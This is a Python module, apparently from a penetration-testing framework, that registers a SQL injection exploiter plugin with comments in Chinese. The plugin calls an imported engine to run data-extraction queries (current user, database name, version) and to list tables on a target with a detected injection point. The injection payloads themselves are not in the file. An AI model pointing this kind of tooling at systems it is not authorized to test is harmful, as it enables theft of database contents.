#!/usr/bin/env python3
"""
SQLi 利用器 - 自动数据提取

警告: 仅限授权渗透测试使用！
"""

import logging
from typing import Any, Dict, Optional

logger = logging.getLogger(__name__)


def register_sqli_exploiter():
    """注册 SQLi 利用器到策略注册表"""
    try:
        from ..engine import (
            BaseExploiter,
            ExploitResult,
            ExploitStatus,
            ExploitType,
            register_exploiter,
        )

        @register_exploiter(["sqli"])
        class SQLiExploiter(BaseExploiter):
            """SQL 注入利用器"""

            name = "sqli_exploiter"
            supported_vuln_types = ["sqli"]
            exploit_type = ExploitType.DATA_EXTRACTION

            def exploit(
                self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
            ) -> ExploitResult:
                """执行 SQLi 利用"""
                targets = targets or {}
                extracted_data: Dict[str, Any] = {}

                url = getattr(detection_result, "url", "")
                param = getattr(detection_result, "param", "")
                payload = getattr(detection_result, "payload", "")
                extra = getattr(detection_result, "extra", {})
                injection_type = extra.get("injection_type", "error-based")
                db_type = extra.get("db_type", "mysql")

                try:
                    from core.exploit.pure_sqli import (
                        DBType,
                        InjectionPoint,
                        PureSQLiEngine,
                        SQLiType,
                    )

                    engine = PureSQLiEngine()
                    ip = InjectionPoint(
                        url=url,
                        method="GET",
                        param=param or "",
                        original_value="1",
                        position="query",
                    )

                    sqli_type_map = {
                        "error-based": SQLiType.ERROR,
                        "time-based": SQLiType.BLIND_TIME,
                        "boolean-based": SQLiType.BLIND_BOOLEAN,
                        "union": SQLiType.UNION,
                    }
                    sqli_type = sqli_type_map.get(injection_type, SQLiType.ERROR)

                    db_type_map = {
                        "mysql": DBType.MYSQL,
                        "postgresql": DBType.POSTGRESQL,
                        "mssql": DBType.MSSQL,
                        "oracle": DBType.ORACLE,
                        "sqlite": DBType.SQLITE,
                    }
                    db = db_type_map.get(db_type, DBType.MYSQL)

                    queries = targets.get(
                        "queries",
                        [
                            "SELECT user()",
                            "SELECT database()",
                            "SELECT @@version",
                        ],
                    )

                    for query in queries:
                        result = engine.extract_data(ip, query, sqli_type, db)
                        if result:
                            extracted_data[query] = result

                    if targets.get("extract_tables", True):
                        tables = engine.get_tables(ip, sqli_type, db)
                        if tables:
                            extracted_data["tables"] = tables

                    engine.close()

                    if extracted_data:
                        return self._create_result(
                            status=ExploitStatus.SUCCESS,
                            vuln_type="sqli",
                            url=url,
                            data=extracted_data,
                            evidence=f"成功提取 {len(extracted_data)} 项数据",
                            payload_used=payload or "",
                            metadata={
                                "injection_type": injection_type,
                                "db_type": db_type,
                            },
                        )
                    else:
                        return self._create_result(
                            status=ExploitStatus.PARTIAL,
                            vuln_type="sqli",
                            url=url,
                            evidence="利用成功但未提取到数据",
                            payload_used=payload or "",
                        )

                except ImportError:
                    return self._create_result(
                        status=ExploitStatus.FAILED,
                        vuln_type="sqli",
                        url=url,
                        error="PureSQLiEngine 模块不可用",
                    )

                except Exception as e:
                    logger.error("[SQLiExploiter] 利用失败: %s", e)
                    return self._create_result(
                        status=ExploitStatus.FAILED,
                        vuln_type="sqli",
                        url=url,
                        error=str(e),
                    )

        logger.info("[SQLiExploiter] 注册成功")
        return SQLiExploiter

    except Exception as e:
        logger.warning("[SQLiExploiter] 注册失败: %s", e)
        return None


# 尝试注册
_sqli_exploiter = register_sqli_exploiter()

__all__ = ["register_sqli_exploiter"]
